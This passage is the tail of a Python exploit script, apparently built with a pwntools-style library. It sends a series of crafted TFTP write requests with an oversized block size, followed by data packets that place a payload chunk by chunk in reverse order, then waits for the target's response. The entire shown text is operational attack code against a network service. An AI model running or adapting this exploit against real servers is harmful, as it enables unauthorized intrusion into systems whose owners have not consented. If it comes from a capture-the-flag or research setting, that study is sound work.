    for byte in chunk:
        if byte == 0:
            if len(temp_byte):
                temp_layout.append(temp_byte)
                temp_byte = b""
            temp_layout.append(b"\x00")
        else:
            temp_byte += bytes([byte])

    if len(temp_byte):
        temp_layout.append(temp_byte)


layout = temp_layout
layout.reverse()
for chunk in layout:
    length = len(chunk)

    temp_payload = dynamic_payload[:-length] + chunk.rstrip(b"\x00") + b"D"
    payload = common_payload + temp_payload
    sock.wrq("upload", "netascii", blksize=(0x300 + total_layout))
    sock.recv()
    sock.data(1, payload)
    info(sock.recv())

    dynamic_payload = dynamic_payload[:-length]


sleep(61)
success(sock.recv_raw())

pause()
```
